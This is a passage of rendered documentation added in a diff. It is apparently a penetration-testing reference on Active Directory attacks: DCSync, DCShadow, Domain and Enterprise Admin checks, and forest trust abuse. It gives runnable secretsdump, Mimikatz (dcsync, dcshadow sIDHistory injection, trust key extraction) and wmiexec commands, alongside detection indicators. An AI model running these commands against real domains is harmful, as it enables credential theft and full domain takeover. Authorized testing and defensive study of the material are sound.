+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="nb">export</span><span class="w"> </span><span class="nv">CHILD_SID</span><span class="o">=</span><span class="s1">&#39;S-1-5-21-4444444444-5555555555-6666666666&#39;</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PARENT_SID</span><span class="o">=</span><span class="s1">&#39;S-1-5-21-1111111111-2222222222-3333333333&#39;</span>
+</span></code></pre></div>
+<h2 id="dcsync">DCSync</h2>
+<p>DCSync abuses Active Directory replication permissions.</p>
+<p>A principal with the right replication permissions can ask a domain controller to replicate password data for domain accounts.</p>
+<p>Required rights commonly include:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>DS-Replication-Get-Changes
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>DS-Replication-Get-Changes-All
+</span></code></pre></div>
+<p>Sometimes this is also relevant:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>DS-Replication-Get-Changes-In-Filtered-Set
+</span></code></pre></div>
+<p>Common principals that normally have replication capability:</p>
+<table>
+<thead>
+<tr>
+<th>Principal</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain Controllers</td>
+<td>Replicate directory data.</td>
+</tr>
+<tr>
+<td>Domain Admins</td>
+<td>Usually have sufficient control.</td>
+</tr>
+<tr>
+<td>Enterprise Admins</td>
+<td>Forest-level high privilege.</td>
+</tr>
+<tr>
+<td>Administrators</td>
+<td>Built-in privileged context.</td>
+</tr>
+<tr>
+<td>Custom delegated accounts</td>
+<td>Dangerous if replication rights were delegated.</td>
+</tr>
+</tbody>
+</table>
+<p>Check DCSync-related ACLs with PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="s2">&quot;DC=corp,DC=local&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    <span class="nv">$_</span><span class="p">.</span><span class="n">ObjectAceType</span> <span class="o">-match</span> <span class="s2">&quot;Replication&quot;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Find replication rights in BloodHound:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>GetChanges
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>GetChangesAll
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>GetChangesInFilteredSet
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>DCSync
+</span></code></pre></div>
+<p>Validate DCSync against one account:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<p>With NT hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<p>Dump one specific user:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-user<span class="w"> </span>Administrator
+</span></code></pre></div>
+<p>Dump domain secrets in a lab when explicitly allowed:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc
+</span></code></pre></div>
+<p>Use Kerberos ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/admin.ccache
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>secretsdump.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$DC_HOST</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<p>Mimikatz DCSync:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>mimikatz.exe
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>lsadump::dcsync /domain:corp.local /user:krbtgt
+</span></code></pre></div>
+<p>DCSync for Administrator:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>lsadump::dcsync /domain:corp.local /user:Administrator
+</span></code></pre></div>
+<p>Useful output:</p>
+<table>
+<thead>
+<tr>
+<th>Output</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NT hash</td>
+<td>Used for Pass-the-Hash or Kerberos RC4 key material.</td>
+</tr>
+<tr>
+<td>AES128/AES256 keys</td>
+<td>Kerberos key material.</td>
+</tr>
+<tr>
+<td>LM hash</td>
+<td>Usually disabled or empty-equivalent in modern environments.</td>
+</tr>
+<tr>
+<td>Supplemental credentials</td>
+<td>Additional credential material.</td>
+</tr>
+<tr>
+<td>krbtgt hash</td>
+<td>Enables Golden Ticket paths.</td>
+</tr>
+</tbody>
+</table>
+<p>Common errors:</p>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>rpc_s_access_denied</code></td>
+<td>Missing replication rights.</td>
+</tr>
+<tr>
+<td><code>STATUS_ACCESS_DENIED</code></td>
+<td>Account lacks required permissions.</td>
+</tr>
+<tr>
+<td>Connection error</td>
+<td>RPC/SMB/DC connectivity issue.</td>
+</tr>
+<tr>
+<td>Kerberos error</td>
+<td>DNS, SPN, time, or ticket issue.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="dcshadow">DCShadow</h2>
+<p>DCShadow abuses replication behavior by registering a rogue domain controller-like replication source and pushing changes into AD.</p>
+<p>This is an advanced domain-compromise technique and normally requires very high privileges.</p>
+<p>Typical requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain Admin or equivalent</td>
+<td>Needed for DCShadow setup and replication abuse.</td>
+</tr>
+<tr>
+<td>Ability to modify AD configuration</td>
+<td>Rogue DC registration path.</td>
+</tr>
+<tr>
+<td>Network access to DCs</td>
+<td>Replication communication.</td>
+</tr>
+<tr>
+<td>Mimikatz or equivalent tooling</td>
+<td>Common tool for DCShadow.</td>
+</tr>
+</tbody>
+</table>
+<p>Common use cases in labs:</p>
+<table>
+<thead>
+<tr>
+<th>Use case</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Modify an attribute</td>
+<td>Add or change an AD attribute.</td>
+</tr>
+<tr>
+<td>Modify <code>sIDHistory</code></td>
+<td>Add privileged SID history.</td>
+</tr>
+<tr>
+<td>Modify AdminSDHolder-related data</td>
+<td>Persistence path.</td>
+</tr>
+<tr>
+<td>Push stealthier changes</td>
+<td>Replication-style modification.</td>
+</tr>
+</tbody>
+</table>
+<p>Mimikatz command structure:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>mimikatz.exe
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>privilege::debug
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>lsadump::dcshadow /object:CN=TargetUser,CN=Users,DC=corp,DC=local /attribute:description /value:&quot;test&quot;
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>lsadump::dcshadow /push
+</span></code></pre></div>
+<p>Example modifying <code>sIDHistory</code> in a lab:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>lsadump::dcshadow /object:CN=TargetUser,CN=Users,DC=corp,DC=local /attribute:sIDHistory /value:S-1-5-21-1111111111-2222222222-3333333333-512
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>lsadump::dcshadow /push
+</span></code></pre></div>
+<p>Check result with LDAP:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>-b<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN_DN</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;(sAMAccountName=TargetUser)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>sAMAccountName<span class="w"> </span>description<span class="w"> </span>sIDHistory
+</span></code></pre></div>
+<p>PowerView check:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="n">TargetUser</span> <span class="n">-Properties</span> <span class="n">sidhistory</span><span class="p">,</span><span class="n">description</span>
+</span></code></pre></div>
+<p>DCShadow indicators:</p>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Rogue DC registration activity</td>
+<td>DCShadow setup behavior.</td>
+</tr>
+<tr>
+<td>Replication metadata changes</td>
+<td>Attribute modification via replication path.</td>
+</tr>
+<tr>
+<td>Unexpected <code>sIDHistory</code></td>
+<td>Possible privilege injection.</td>
+</tr>
+<tr>
+<td>Changes not matching normal admin tools</td>
+<td>Suspicious modification path.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="domain-admin">Domain Admin</h2>
+<p>Domain Admin control is a common domain-compromise milestone.</p>
+<p>Domain Admins normally have administrative control over domain-joined systems and domain controllers.</p>
+<p>Check Domain Admin membership:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>members<span class="w"> </span><span class="s2">&quot;Domain Admins&quot;</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-S<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">-Recurse</span>
+</span></code></pre></div>
+<p>AD module:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">Get-ADGroupMember</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">-Recursive</span>
+</span></code></pre></div>
+<p>Check if current user is Domain Admin:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>whoami /groups
+</span></code></pre></div>
+<p>Validate privileged SMB access to DC:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--shares
+</span></code></pre></div>
+<p>Validate WinRM where enabled:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Validate DCSync:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc-user<span class="w"> </span>krbtgt
+</span></code></pre></div>
+<p>Validate remote command execution only when explicitly allowed:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>wmiexec.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>Common ways Domain Admin is reached:</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Group membership abuse</td>
+<td>Add user to Domain Admins.</td>
+</tr>
+<tr>
+<td>Password reset</td>
+<td>Take over existing Domain Admin.</td>
+</tr>
+<tr>
+<td>Credential dumping</td>
+<td>Extract Domain Admin hash/ticket.</td>
+</tr>
+<tr>
+<td>Kerberoasting</td>
+<td>Crack privileged service account.</td>
+</tr>
+<tr>
+<td>ACL abuse</td>
+<td>WriteDACL, GenericAll, AddMember path.</td>
+</tr>
+<tr>
+<td>AD CS abuse</td>
+<td>Certificate authentication as privileged user.</td>
+</tr>
+<tr>
+<td>Session hijacking/ticket theft</td>
+<td>Admin session on controlled host.</td>
+</tr>
+<tr>
+<td>Backup system compromise</td>
+<td>Restore/extract high-value secrets.</td>
+</tr>
+</tbody>
+</table>
+<p>Domain Admin does not always mean Enterprise Admin. In multi-domain forests, validate exact scope.</p>
+<h2 id="enterprise-admin">Enterprise Admin</h2>
+<p>Enterprise Admin is a forest-level privileged group.</p>
+<p>It exists in the forest root domain and can affect all domains in the forest.</p>
+<p>Check forest:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">Get-ADForest</span>
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">Get-Forest</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nb">Get-ForestDomain</span>
+</span></code></pre></div>
+<p>Check Enterprise Admins:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Enterprise Admins&quot;</span> <span class="n">-Domain</span> <span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="n">-Recurse</span>
+</span></code></pre></div>
+<p>AD module:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">Get-ADGroupMember</span> <span class="s2">&quot;Enterprise Admins&quot;</span> <span class="n">-Recursive</span>
+</span></code></pre></div>
+<p>LDAP:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>-b<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN_DN</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=group)(cn=Enterprise Admins))&quot;</span><span class="w"> </span>member
+</span></code></pre></div>
+<p>Validate forest root context:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>nltest /domain_trusts
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>nltest /dclist:corp.local
+</span></code></pre></div>
+<p>Enterprise Admin impact:</p>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Forest-wide administrative control</td>
+<td>High-impact across domains.</td>
+</tr>
+<tr>
+<td>Cross-domain privilege</td>
+<td>Can affect child domains.</td>
+</tr>
+<tr>
+<td>Schema-level access path</td>
+<td>Often close to Schema Admin capability.</td>
+</tr>
+<tr>
+<td>Trust and domain management</td>
+<td>Forest administration context.</td>
+</tr>
+</tbody>
+</table>
+<p>Common paths to Enterprise Admin:</p>
+<table>
+<thead>
+<tr>
+<th>Path</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Compromise forest root Domain Admin</td>
+<td>Add or control Enterprise Admins.</td>
+</tr>
+<tr>
+<td>Child-to-parent abuse</td>
+<td>Extra SID / trust abuse path.</td>
+</tr>
+<tr>
+<td>Trust key compromise</td>
+<td>Inter-realm ticket path.</td>
+</tr>
+<tr>
+<td>Admin session theft</td>
+<td>Enterprise Admin logged into compromised host.</td>
+</tr>
+<tr>
+<td>AD CS or ACL path</td>
+<td>Privileged certificate or object control path.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="trust-abuse">Trust Abuse</h2>
+<p>Trust abuse targets authentication and authorization relationships between domains or forests.</p>
+<p>Enumerate trusts:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>nltest /domain_trusts
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">Get-DomainTrust</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="nb">Get-DomainTrustMapping</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="nb">Get-ForestTrust</span>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="nb">Get-ForestDomain</span>
+</span></code></pre></div>
+<p>AD module:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nb">Get-ADForest</span>
+</span></code></pre></div>
+<p>LDAP trusted domain objects:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>-b<span class="w"> </span><span class="s2">&quot;CN=System,</span><span class="nv">$DOMAIN_DN</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=trustedDomain)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>cn<span class="w"> </span>trustPartner<span class="w"> </span>trustDirection<span class="w"> </span>trustType<span class="w"> </span>trustAttributes<span class="w"> </span>flatName<span class="w"> </span>securityIdentifier
+</span></code></pre></div>
+<p>Important trust properties:</p>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Direction</td>
+<td>Inbound, outbound, or bidirectional.</td>
+</tr>
+<tr>
+<td>Transitivity</td>
+<td>Whether trust extends beyond direct trust.</td>
+</tr>
+<tr>
+<td>Trust type</td>
+<td>Parent-child, tree-root, external, forest.</td>
+</tr>
+<tr>
+<td>SID filtering</td>
+<td>Affects SID-based abuse.</td>
+</tr>
+<tr>
+<td>Selective authentication</td>
+<td>Limits cross-trust access.</td>
+</tr>
+<tr>
+<td>Trust attributes</td>
+<td>Flags describing trust behavior.</td>
+</tr>
+</tbody>
+</table>
+<p>Direction reminder:</p>
+<table>
+<thead>
+<tr>
+<th>Direction</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Inbound</td>
+<td>Other domain trusts users from this domain.</td>
+</tr>
+<tr>
+<td>Outbound</td>
+<td>This domain trusts users from the other domain.</td>
+</tr>
+<tr>
+<td>Bidirectional</td>
+<td>Both domains trust each other.</td>
+</tr>
+</tbody>
+</table>
+<p>Dump trust account secrets if DCSync/domain compromise is available:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>secretsdump.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>@<span class="nv">$DC_IP</span><span class="w"> </span>-just-dc
+</span></code></pre></div>
+<p>Look for trust accounts:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>TRUSTEDDOMAIN$
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>CHILDDOMAIN$
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>PARENTDOMAIN$
+</span></code></pre></div>
+<p>Mimikatz trust key extraction on DC in lab:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>mimikatz.exe
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>lsadump::trust /patch
+</span></code></pre></div>
+<p>Inter-realm ticket abuse depends on trust direction, trust keys, SID filtering, and target access.</p>
+<p>Trust abuse targets:</p>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Parent domain</td>
+<td>Common child-to-parent escalation target.</td>
+</tr>
+<tr>
+<td>Child domain</td>
+<td>Movement from parent to child.</td>
+</tr>
+<tr>
+<td>External domain</td>
+<td>Depends on trust scope and SID filtering.</td>
+</tr>
+<tr>
+<td>Forest trust</td>
+<td>Depends on selective authentication and forest settings.</td>
+</tr>
+<tr>
+<td>Resource domain</td>
+<td>Access depends on ACLs and group membership.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="child-to-parent">Child to Parent</h2>
+<p>Child-to-parent compromise targets escalation from a child domain to the forest root or parent domain.</p>
+<p>A classic lab path uses:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>Child domain compromise
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>Child krbtgt key
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>Child domain SID
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>Parent domain SID
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>Extra SID: Enterprise Admins or parent privileged group SID
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>Forged ticket with extra SID
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>Access to parent domain resources
+</span></code></pre></div>
+<p>Required information:</p>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Child domain</td>
+<td><code>dev.corp.local</code></td>
+</tr>
+<tr>
+<td>Parent domain</td>
+<td><code>corp.local</code></td>
+</tr>
+<tr>
+<td>Child SID</td>
+<td><code>S-1-5-21-4444-5555-6666</code></td>
+</tr>
+<tr>
+<td>Parent SID</td>
+<td><code>S-1-5-21-1111-2222-3333</code></td>
+</tr>
+<tr>
+<td>Parent Enterprise Admins SID</td>
+<td><code>PARENT_SID-519</code></td>
+</tr>
+<tr>
